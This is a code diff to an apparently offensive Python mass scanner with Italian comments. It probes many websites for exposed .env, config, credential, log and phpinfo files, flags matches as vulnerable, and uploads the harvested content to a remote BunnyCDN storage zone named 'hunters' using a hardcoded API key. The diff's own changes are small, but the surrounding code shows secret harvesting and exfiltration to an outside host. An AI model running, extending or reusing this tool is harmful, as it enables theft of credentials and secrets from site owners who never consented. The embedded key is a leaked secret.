@@ -44,16 +44,6 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 # Disabilita i warning di urllib3 per header HTTP malformati (es. Content-Length e Transfer-Encoding insieme)
 logging.getLogger("urllib3").setLevel(logging.ERROR)
 
-import http.cookiejar
-# Prevenire crash di http.cookiejar su cookie malformati (bug noto in Python 3.12)
-original_extract_cookies = http.cookiejar.CookieJar.extract_cookies
-def patched_extract_cookies(self, response, request):
-    try:
-        original_extract_cookies(self, response, request)
-    except Exception:
-        pass
-http.cookiejar.CookieJar.extract_cookies = patched_extract_cookies
-
 # Costanti e Configurazioni
 BUNNY_STORAGE_URL = "https://storage.bunnycdn.com/hunters"
 BUNNY_API_KEY = os.getenv("BUNNY_API_KEY", "a34bea81-b348-49fb-a28ef869d967-3fe2-43fc")
@@ -308,8 +298,8 @@ def find_subdomains(domain: str) -> Optional[List[str]]:
 # --- Scomposizione Funzioni di Analisi ---
 
 def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
-    """Controlla se la risposta indica un 'fake site' (es. wildcard catch-all).
-    Ritorna (is_fake, is_valid_url)"""
+ #   """Controlla se la risposta indica un 'fake site' (es. wildcard catch-all).
+  #  Ritorna (is_fake, is_valid_url)"""
     try:
         content = r.content
         content_lower = content.lower()
@@ -326,7 +316,7 @@ def check_fake_responses(r: requests.Response) -> Tuple[bool, bool]:
     return False, False
 
 def parse_phpinfo(html_content: str) -> Optional[str]:
-    """Estrae le variabili PHP da una pagina phpinfo() usando regex (molto più veloce e non blocca gevent)"""
+  #  """Estrae le variabili PHP da una pagina phpinfo() usando regex (molto più veloce e non blocca gevent)"""
     try:
         match_table = re.search(r'>PHP Variables</h2>(.*?)</table>', html_content, re.IGNORECASE | re.DOTALL)
         if match_table:
@@ -352,7 +342,7 @@ def parse_phpinfo(html_content: str) -> Optional[str]:
     return None
 
 def validate_regex(contentsx: str, is_php_file: bool, is_html_content: bool, is_env_file: bool) -> bool:
-    """Verifica se il contenuto matcha le regex vulnerabili in configurazione."""
+  #  """Verifica se il contenuto matcha le regex vulnerabili in configurazione."""
     regex_found = False
     for pattern in KEYWORD_REGEX_ENV:
         if "PHP Version" in pattern and not (is_php_file or is_html_content): continue
@@ -374,7 +364,7 @@ def validate_regex(contentsx: str, is_php_file: bool, is_html_content: bool, is_
     return regex_found
 
 def save_vulnerability_file(file_type: str, response_url: str, contentsx: str, site_link: str, code: str) -> None:
-    """Salva il file vulnerabile e lo carica su Bunny."""
+   # """Salva il file vulnerabile e lo carica su Bunny."""
     rnd_suffix = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
     file_base_name = f'DIABLO_{file_type}'
     
@@ -389,14 +379,14 @@ def save_vulnerability_file(file_type: str, response_url: str, contentsx: str, s
         
     # Scrittura del file split
     saved_file_path = NEW_PATH_EXTRACT / f'{file_base_name}_{rnd_suffix}.txt'
-    with open(saved_file_path, 'w', encoding='utf-8') as f:
+    with open(saved_file_path, 'a', encoding='utf-8') as f:
         f.write(f'{response_url}\n{contentsx}\n')
         
     remote_subpath = f"risultati/DIABLO_FILES_SPLIT/{file_base_name}_{rnd_suffix}.txt"
     upload_file_to_bunny(saved_file_path, remote_subpath)
 
 def execute_pivot_search(site_link: str) -> None:
-    """Esegue pivot lookup per IP o domini trovati vulnerabili."""
+  #  """Esegue pivot lookup per IP o domini trovati vulnerabili."""
     hostxxx = urlparse(site_link).hostname
     if hostxxx and hostxxx.startswith("www."):
         hostxxx = hostxxx[4:]
@@ -443,7 +433,7 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
         # 1. Scansione preliminare ENV
         env_batches = site_payloads.get('env', [])
         for batch in env_batches:
-            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout, cookies={}) for url in batch]
+            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
             merdb = grequests.map(reqss, size=50)
             for r in merdb:
                 if r is not None and r.status_code in [200, 206, requests.codes.ok]:
@@ -461,7 +451,7 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
         # 2. Scansione preliminare PHP
         php_batches = site_payloads.get('php', [])
         for batch in php_batches:
-            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout, cookies={}) for url in batch]
+            reqss = [grequests.get(url, stream=True, timeout=10, verify=False, allow_redirects=False, headers=headers_scout) for url in batch]
             merdb = grequests.map(reqss, size=50)
             for r in merdb:
                 if r is not None and r.status_code in [200, 206, requests.codes.ok]:
@@ -483,9 +473,9 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
             url_lower_check = url.lower()
             is_static = any(x in url_lower_check for x in ['.env', '.js', '.json', '.txt', '.yml', '.yaml', '.ini', '.xml', '.log', '.zip', '.bak', '.sql', '.conf', 'config', '.local', '.remote', '.production', '.old', '.save', 'credentials', 'cache', 'laravel', 'public', 'pusher'])
             if is_static:
-                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe, cookies={})
+                req = grequests.get(url, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
             else:
-                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe, cookies={})
+                req = grequests.post(url, data={"0x01[]":"legion"}, timeout=6, stream=True, verify=False, allow_redirects=False, headers=headers_file_probe)
             findfile_requests.append(req)
             
         responsesf = grequests.map(findfile_requests, size=50)
@@ -618,7 +608,7 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
                             f.write(f'{site_link} 8\n')
                         
                         saved_php_path = NEW_PATH_EXTRACT / f'DIABLO_PHPINFO_{rnd_suffix_php}.txt'
-                        with open(saved_php_path, 'w', encoding='utf-8') as f: 
+                        with open(saved_php_path, 'a', encoding='utf-8') as f: 
                             f.write(f'{response_url}\n{formatted_phpinfo}\n')
                         
                         upload_file_to_bunny(saved_php_path, f"risultati/DIABLO_FILES_SPLIT/DIABLO_PHPINFO_{rnd_suffix_php}.txt")
@@ -638,11 +628,11 @@ def _scan_site(site_link: str, site_payloads: Dict[str, List[List[str]]], is_fal
             f.write(str(e) + '\n')
 
 def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False) -> None:
-    """Funzione comune per testare la connettività di un blocco di URL e avviare la scansione sui target vivi."""
+   # """Funzione comune per testare la connettività di un blocco di URL e avviare la scansione sui target vivi."""
     logger.info(f"[SCANNER] Controllo blocco di {len(urls_list)} target...")
     try:
         resp_site = [
-            grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False, cookies={})
+            grequests.get(get_initial_url(url), timeout=3, stream=True, verify=False, allow_redirects=False)
             for url in urls_list
         ]
         merdb = grequests.map(resp_site, size=50)
@@ -667,7 +657,7 @@ def check_connectivity_and_scan(urls_list: List[str], is_fallback: bool = False)
         if retry_urls:
             logger.info(f"[SCANNER] Retry su {len(retry_urls)} target con protocollo alternativo...")
         resp_retry = [
-            grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False, cookies={})
+            grequests.get(url, timeout=3, stream=True, verify=False, allow_redirects=False)
             for url in retry_urls
         ]
         retry_responses = grequests.map(resp_retry, size=50)
